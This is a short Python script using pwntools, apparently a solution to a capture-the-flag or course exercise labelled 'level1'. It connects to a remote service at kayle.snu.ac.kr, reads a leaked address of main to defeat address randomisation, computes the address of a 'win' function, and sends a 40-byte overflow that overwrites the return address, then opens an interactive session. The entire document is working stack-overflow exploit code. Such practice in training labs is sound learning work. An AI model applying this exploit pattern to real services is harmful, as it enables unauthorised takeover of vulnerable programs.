from pwn import *

port = 10005
rem = remote("kayle.snu.ac.kr", port)

elf = ELF("./level1/problem/level1")

rem.recvuntil(b'<<< ')

main_addr = int(rem.recvn(14)[2:].decode(), 16)
win_addr = main_addr + elf.symbols['win'] - elf.symbols['main']

payload = b'A' * 40 + p64(win_addr + 1)
rem.recvuntil(b'\n')
rem.sendline(payload)

rem.interactive()